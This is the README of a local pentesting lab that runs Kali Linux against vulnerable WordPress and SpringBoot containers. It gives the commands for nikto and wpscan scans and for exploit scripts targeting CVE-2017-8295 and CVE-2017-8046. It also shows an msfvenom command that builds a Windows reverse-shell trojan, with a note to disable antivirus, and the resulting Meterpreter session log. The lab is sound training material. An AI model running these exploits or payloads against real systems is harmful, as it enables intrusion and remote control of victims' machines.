# hack-yourself
Sample project showing how to hack your own servers

> **Legal Disclaimer**:
> * Users are responsible for usage of the prepared setup
> * We does not encourage, condone, or orchestrate attempts to hack into other servers or any other illegal activities. The writings and instructions contained inside this website are entertainment / educational purposes only

## Prerequisite

 * Docker for mac or download docker from [Docker](https://www.docker.com/)
 * Check if you have 10GB space available in your HD
 * Docker composer to make it easy to run at local.

## What's included

![](docs/images/docker-compose.png)

###  Official Kali Linux Docker
This Kali Linux Docker image provides a minimal base install of the latest version of the Kali Linux Rolling Distribution.
There are no tools added to this image, so you will need to install them yourself.
For details about Kali Linux metapackages, check the [homepage](https://www.kali.org/news/kali-linux-metapackages/)

#### Features in Kali Docker image
* Metasploit Framework (https://www.metasploit.com/)

### Local Wordpress for Evaluation

* Preconfigured WordPress 4.6
* MySQL Container

## Usage

# Setup Instructions
* Clone the repo from `https://github.com/holisticon/hack-yourself.git`.
* `./start.sh`
* Your environment is ready

# Setup your project locally for pentesting
(Its not good practice yo run the pentesting on the prod server or the unauthorized server, its not legal so I am suggesting this to run on local and these instruction will help you to setup the project at local server, try to make the same sever as your project has on public facing).

# Run the demo code
After running `./start.sh` your already inside the kali container and can run nikto etc. against the local wordpress:
```
nikto -C all -host blog_app
wpscan blog_app

```
Run attack against blog inside docker for [CVE-2017-8295](https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html):
```
wp_2017-8295.sh <use-your-mail-domain-here> blog_app admin
```

Run attack for [CVE--2017-8046](https://pivotal.io/security/cve-2017-8046) against [SpringBoot App](https://github.com/holisticon/SpringBreakVulnerableApp) inside docker:
```
sb_2017-8046.sh sb_app:8080 calc.exe # or perl in linux
```

If you want to active try out what exploits can cause, give [metasploit](https://www.metasploit.com) a try. We first create a trojan which will be provided at `./docker/kali/share/trojan.exe`:
```
> msfvenom -p windows/meterpreter/reverse_tcp   â€” platform windows-a x86 -f exe LHOST="192.168.69.194" LPORT=8888 -o /share/trojan.exe
> msfconsole

PAYLOAD => windows/meterpreter/reverse_tcp

[*] Started reverse TCP handler on 0.0.0.0:8888
```
You can now run the trojan.exe on a windows computer (ensure to disable antivirus software ;) ) and we will then see in msf the connection:
```
[*] Sending stage (179779 bytes) to 172.27.0.1
[*] Meterpreter session 1 opened (172.27.0.4:8888 -> 172.27.0.1:44510) at 2018-06-03 10:22:35 +0000
```
It will then start a meterpreter session and you can use several commands to get more into your "victim":
```
meterpreter > help
